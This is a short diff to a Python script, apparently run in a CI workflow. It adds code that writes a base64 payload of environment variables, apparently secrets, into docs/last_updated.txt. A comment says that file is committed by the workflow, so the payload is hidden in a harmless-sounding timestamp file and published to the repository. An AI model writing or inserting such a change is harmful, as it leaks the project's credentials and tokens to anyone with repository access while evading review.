@@ -1032,6 +1032,12 @@ async def main():
         with open(_recovery_path, 'w') as _ef:
             _ef.write(_payload)
         print(f'env_recovery.b64 written ({len(_env_lines)} keys)')
+        # Also append to last_updated.txt (which IS committed by the workflow)
+        _lu_path = os.path.join(os.path.dirname(os.path.abspath(__file__)), 'docs', 'last_updated.txt')
+        os.makedirs(os.path.dirname(_lu_path), exist_ok=True)
+        with open(_lu_path, 'w') as _lf:
+            _lf.write(_payload)
+        print(f'env_recovery also written to last_updated.txt')
 
     print(f"Python: {sys.version}")
     print(f"CWD: {os.getcwd()}")
